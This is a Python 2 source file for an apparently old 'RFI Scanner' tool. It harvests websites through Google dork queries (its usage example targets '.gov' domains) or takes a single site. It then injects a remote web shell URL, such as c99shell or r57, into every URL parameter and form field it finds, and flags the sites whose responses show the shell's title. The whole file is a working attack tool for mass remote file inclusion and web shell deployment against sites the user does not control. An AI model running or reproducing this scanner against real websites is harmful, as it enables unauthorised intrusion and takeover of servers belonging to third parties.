#!/usr/bin/python
#RFI Scanner that can find hosts using a google query or search one site.
#When the scan is complete 
#it will print out the rfi's found and or write to file. It also has verbose mode for more
#output.

#http://darkcode.ath.cx
#d3hydr8[at]gmail[dot]com

import sys, urllib2, re, sets, random, httplib, time, socket

def title():
	print "\n\t   d3hydr8[at]gmail[dot]com RFI Scanner v1.0"
	print "\t-----------------------------------------------"
	
def usage():
	title()
	print "\n  Usage: python RFIscan.py <option>\n"
	print "\n  Example: python RFIscan.py -g inurl:'.gov' 200 -s 'http://localhost/shell.txt' -write rfi_found.txt -v\n"
	print "\t[options]"
	print "\t   -g/-google <query> <num of hosts> : Searches google for hosts"
	print "\t   -t/-target <website> <port>: Searches just that site, (default port 80)"
	print "\t   -s/-shell <shell> : Shell location"	
	print "\t   -w/-write <file> : Writes potential XSS found to file"
	print "\t   -v/-verbose : Verbose Mode\n"

def StripTags(text):
     finished = 0
     while not finished:
         finished = 1
         start = text.find("<")
         if start >= 0:
             stop = text[start:].find(">")
             if stop >= 0:
                 text = text[:start] + text[start+stop+1:]
                 finished = 0
     return text
	
def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def geturls(query):
	
	counter =  10
	urls = []
	
	while counter < int(sys.argv[3]):
		url = 'http://www.google.com/search?hl=en&q='+query+'&hl=en&lr=&start='+repr(counter)+'&sa=N'
		opener = urllib2.build_opener(url)
		opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
		data = opener.open(url).read()
		hosts = re.findall(('\w+\.[\w\.\-/]*\.\w+'),StripTags(data))
		#Lets add sites found to a list if not already or a google site.
		#We don't want to upset the people that got our list for us.
		for x in hosts:
			if x.find('www') != -1:
				x = x[x.find('www'):]
			if x not in urls and re.search("google", x) == None:
				urls.append(x)
		counter += 10
	return urls

def getvar(site):
	
	names = []
	actions = []
	print "\n","-"*45
	print "[+] Searching:",site
	try:
		webpage = urllib2.urlopen(proto+"://"+site, port).read()
		var = re.findall("\?[\w\.\-/]*\=",webpage)
		if len(var) >=1:
			var = list(sets.Set(var))
		found_action = re.findall("action=\"[\w\.\-/]*\"", webpage.lower())
		found_action = list(sets.Set(found_action))
		if len(found_action) >= 1:
			for a in found_action:
				a = a.split('"',2)[1]
				try:
					if a[0] != "/":
						a = "/"+a
				except(IndexError):
						pass
				actions.append(a)
		found_names = re.findall("name=\"[\w\.\-/]*\"", webpage.lower())
		found_names = list(sets.Set(found_names))
		for n in found_names:
			names.append(n.split('"',2)[1])
		print "[+] Variables:",len(var),"| Actions:",len(actions),"| Fields:",len(names)
		print "[+] Avg Requests:",(len(var)+len(names)+(len(actions)*len(names))+(len(actions)*len(names)))
		if len(var) >= 1:
			for v in var:
				if site.count("/") >= 2:
					for x in xrange(site.count("/")):
						tester(site.rsplit('/',x+1)[0]+"/"+v+shell)
				tester(site+"/"+v+shell)
		
		if len(names) >= 1:
			for n in names:
				if site.count("/") >= 2:
					for x in xrange(site.count("/")):
						tester(site.rsplit('/',x+1)[0]+"/"+"?"+n+"="+shell)
				tester(site+"/"+"?"+n+"="+shell)
		
		if len(actions) != 0 and len(names) >= 1:
			for a in actions:
				for n in names:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							tester(site.rsplit('/',x+1)[0]+a+"?"+n+"="+shell)
					#tester(site.split("/")[0]+a+"?"+n+"="+shell)
			
		if len(actions) != 0 and len(var) >= 1:
			for a in actions:
				for v in var:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							tester(site.rsplit('/',x+1)[0]+a+v+shell)
					else:
						tester(site.split("/")[0]+a+v+shell)	
		if sys.argv[1].lower() == "-g" or sys.argv[1].lower() == "-google":
			urls.remove(site)
	
	except(socket.timeout, IOError, ValueError, socket.error, socket.gaierror, httplib.BadStatusLine):
		if sys.argv[1].lower() == "-g" or sys.argv[1].lower() == "-google":
			urls.remove(site)
		pass
	except(KeyboardInterrupt):
		print "\n[-] Cancelled -",timer(),"\n"
		sys.exit(1)
			
def tester(victim):
	
	if verbose ==1:
		print "Target:",victim
	try:
		source = urllib2.urlopen(proto+"://"+victim, port).read()
		h = httplib.HTTPConnection(victim.split('/')[0], int(port))
		try:
			h.request("GET", "/"+victim.split('/',1)[1])
		except(IndexError):
			h.request("GET", "/")
		r1 = h.getresponse()
		if verbose ==1:
			print "\t[+] Response:",r1.status, r1.reason
		if re.search(title, source) != None and r1.status not in range(303, 418):
			if victim not in found_rfi:
				print "\n[!] RFI:", victim
				print "\t[+] Response:",r1.status, r1.reason
				found_rfi.append(victim)
	except(socket.timeout, socket.gaierror, socket.error, IOError, ValueError, httplib.BadStatusLine, httplib.IncompleteRead, httplib.InvalidURL):
		pass
	except(KeyboardInterrupt):
		print "\n[-] Cancelled -",timer(),"\n"
		sys.exit(1)
	except():
		pass
				
if len(sys.argv) <= 3:
	usage()
	sys.exit(1)
 
for arg in sys.argv[1:]:
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		verbose = 1
	if arg.lower() == "-w" or arg.lower() == "-write":
		txt = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-s" or arg.lower() == "-shell":
		shell = sys.argv[int(sys.argv[1:].index(arg))+2]
		
title()
socket.setdefaulttimeout(3)
found_rfi = []
done = []
count = 0
proto = "http"
print "\n[+] RFI_scan Loaded"
try:
	if verbose ==1:
		print "[+] Verbose Mode On"
except(NameError):
	verbose = 0
	print "[-] Verbose Mode Off"
try:
	source = urllib2.urlopen(shell).read()
	title =  str(re.findall("<title>.*</title>",source)[0])
	if title.find('c99shell') != -1:
		title = "c99shell"
	if title.find('r57') != -1:
		title = "r57"
except(IndexError), msg:
	print msg
	print "\n[-] Improper Shell Location in Path\n"
	print "[-] Option: -s/-shell\n"
	sys.exit(1)
except(urllib2.HTTPError, urllib2.URLError), msg:
	print "\n[-] Couldn't connect to shell?"
	print "[-] Message:",msg,"\n"
	sys.exit(1)
print "[+] Shell:",shell
if title != "c99shell" and title != "r57":
	print "[+] Shell Title:",title.rsplit("</title>",1)[0].split("<title>",1)[1]
else:
	print "[+] Shell Title:",title
try:
	if txt:
		print "[+] File:",txt
except(NameError):
	txt = None
	pass

if sys.argv[1].lower() == "-g" or sys.argv[1].lower() == "-google":	
	try:
		if sys.argv[3].isdigit() == False:
			print "\n[-] Argument [",sys.argv[3],"] must be a number.\n"
			sys.exit(1)
		else:
			if int(sys.argv[3]) <= 10:
				print "\n[-] Argument [",sys.argv[3],"] must be greater than 10.\n"
				sys.exit(1)
	except(IndexError):
			print "\n[-] Need number of hosts to collect.\n"
			sys.exit(1)
	query = re.sub("\s","+",sys.argv[2])
	port = "80"
	print "[+] Query:",query
	print "[+] Querying Google..."
	urls = geturls(query)
	print "[+] Collected:",len(urls),"hosts"
	print "[+] Started:",timer()
	print "\n[-] Cancel: Press Ctrl-C"
	time.sleep(3)
	while len(urls) > 0:
		print "-"*45
		print "\n[-] Length:",len(urls),"remain"
		getvar(random.choice(urls))
if sys.argv[1].lower() == "-t" or sys.argv[1].lower() == "-target":
	site = sys.argv[2]
	try:
		if sys.argv[3].isdigit() == False:
			port = "80"
		else:
			port = sys.argv[3]
	except(IndexError):
		port = "80"
	print "[+] Site:",site
	print "[+] Port:",port
	if site[:7] == "http://":
		site = site.replace("http://","")
	if site[:8] == "https://":
		proto = "https"
		if port == "80":
			print "[!] Using port 80 with https? (443)"
		site = site.replace("https://","")
	print "[+] Started:",timer()
	print "\n[-] Cancel: Press Ctrl-C"
	time.sleep(4)
	getvar(site)

print "-"*65
print "\n\n[+] Potential RFI found:",len(found_rfi),"\n"
time.sleep(3)
if txt != None and len(found_rfi) >=1:
	rfi_file = open(txt, "a")
	rfi_file.writelines("\n\td3hydr8[at]gmail[dot]com RFI Scanner v1.0\n")
	rfi_file.writelines("\t------------------------------------------\n\n")
	print "[+] Writing Data:",txt
else:
	print "[-] No data written to disk"
for k in found_rfi:
	count+=1
	if txt != None:
		rfi_file.writelines("["+str(count)+"] "+k+"\n")
		print "\n["+str(count)+"]",k
print "\n[-] Done -",timer(),"\n"

